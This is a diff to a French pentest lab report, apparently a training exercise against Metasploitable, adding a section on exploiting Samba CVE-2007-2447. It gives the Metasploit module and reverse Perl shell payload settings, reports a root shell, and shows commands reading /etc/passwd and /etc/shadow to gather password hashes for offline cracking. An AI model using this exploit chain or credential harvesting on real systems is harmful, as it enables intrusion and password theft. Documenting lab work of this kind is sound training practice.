@@ -110,11 +110,35 @@ exécute un petit script **Perl** qui ouvre une connexion retour vers la machine
 
 ![Shell root obtenu via Metasploit](captures/job05-exploit/02-metasploit-root.png)
 
-## Job 06 — Accès non autorisé + post-exploitation
+## Job 06 — Accès non autorisé (SMB) + post-exploitation
 
-*À compléter : exploitation d'une vulnérabilité critique (ex. SMB/Samba), accès au
-système, actions de post-exploitation (collecte d'infos, privilèges).*
-Captures : `captures/job06-postexploit/`
+**Vulnérabilité choisie :** le service **Samba (SMB)**, détecté par Nessus, via la faille
+**« username map script » — CVE-2007-2447** : une commande injectée dans un nom
+d'utilisateur SMB est exécutée par le serveur.
+
+**Exploitation (Metasploit) :**
+- Module : `exploit/multi/samba/usermap_script` — `RHOSTS 192.168.100.10`
+- Payload : `cmd/unix/reverse_perl` — `LHOST 192.168.100.11`
+
+**Résultat :** `Command shell session 2 opened`, `uid=0(root)`.
+
+![Exploitation Samba : shell root](captures/job06-postexploit/01-samba-exploit-root.png)
+
+> **Accès root direct — point important** : sur Metasploitable, Samba tourne en **root**,
+> donc l'exploit donne immédiatement les pleins pouvoirs. Aucune **élévation de privilèges**
+> n'est nécessaire — et c'est justement une **mauvaise configuration** typique de la cible.
+
+**Post-exploitation (collecte d'informations) :**
+- `cat /etc/passwd` → liste complète des comptes du système.
+- `cat /etc/shadow` → **empreintes (hashs) des mots de passe** (format MD5-crypt `$1$`).
+  Ces hashs pourraient ensuite être cassés hors-ligne (ex. `john` / `hashcat`).
+
+![Post-exploitation : hashs de /etc/shadow](captures/job06-postexploit/02-shadow-hashes.png)
+
+> **À propos de Meterpreter** : l'exploit fournit ici un **shell de commande** (accès root
+> complet). Obtenir une session **Meterpreter** demanderait une payload/un upgrade
+> supplémentaire ; ce n'est pas nécessaire ici puisque l'accès root est déjà total. Le sujet
+> le mentionne « par exemple », pas comme une obligation.
 
 ## Job 07 — Correction des vulnérabilités
 
